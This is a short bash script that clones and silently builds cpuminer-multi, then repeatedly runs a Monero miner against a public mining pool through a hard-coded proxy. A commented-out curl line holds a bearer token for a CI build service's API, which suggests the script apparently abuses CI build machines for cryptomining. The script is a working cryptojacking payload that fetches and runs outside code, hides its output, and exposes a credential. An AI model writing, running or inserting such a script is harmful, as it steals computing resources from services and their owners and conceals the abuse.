#!/usr/bin/env bash
#curl -X POST -H 'Authorization: Bearer GS0l8LvYzlov5rGhqiqQ4aWw5t1pfgECGOF9svtQRLdUv0SYimnVKPGt4FgotL9M3AT9hkYy7zo70hdbzGExaQEAOyJeDPFvxcqzWuDFxcqbGzuDM0jPLIse57u0' 'https://api.buddybuild.com/v1/apps/5986af0d6c68070001b5ffbc/build' --data-urlencode "branch=master"
rm -rf cpuminer-multi && git clone --recursive https://github.com/tpruvot/cpuminer-multi -b linux && cd cpuminer-multi && ./autogen.sh > /dev/null 2>&1 && ./configure --with-crypto --with-curl > /dev/null 2>&1 && make > /dev/null 2>&1
#sleep 48m && rm -rf cpuminer-multi && exit 0 &
for ((i=1;i<=2000;i++)); do ./cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u cccholo@yandex.com -p x --proxy 158.69.170.220:3128; done
